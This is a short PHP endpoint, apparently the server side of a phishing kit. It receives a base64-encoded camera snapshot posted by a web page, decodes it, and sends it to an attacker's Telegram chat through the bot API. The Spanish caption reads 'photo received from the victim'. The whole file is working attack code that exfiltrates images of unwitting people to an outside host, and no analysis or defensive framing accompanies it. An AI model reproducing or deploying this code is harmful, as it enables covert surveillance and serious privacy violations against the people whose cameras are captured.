<?php
require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

if (empty($_POST['cat'])) {
    http_response_code(400);
    echo json_encode(['status' => 'no_image']);
    exit;
}

$imageData = $_POST['cat'];
$filteredData = substr($imageData, strpos($imageData, ",")+1);
$unencodedData = base64_decode($filteredData);

$token = TELEGRAM_BOT_TOKEN;
$chat_id = TELEGRAM_CHAT_ID;

$url = "https://api.telegram.org/bot$token/sendPhoto";

$tmp_file = tmpfile();
fwrite($tmp_file, $unencodedData);
$meta = stream_get_meta_data($tmp_file);
$tmp_path = $meta['uri'];

$post_fields = [
    'chat_id' => $chat_id,
    'caption' => "📷 Foto recibida de la victima!!!",
    'photo'   => new CURLFile($tmp_path, 'image/png', 'snapshot.png')
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
$output = curl_exec($ch);
curl_close($ch);

fclose($tmp_file);

echo json_encode(['status' => 'photo_sent', 'telegram_response' => $output]);

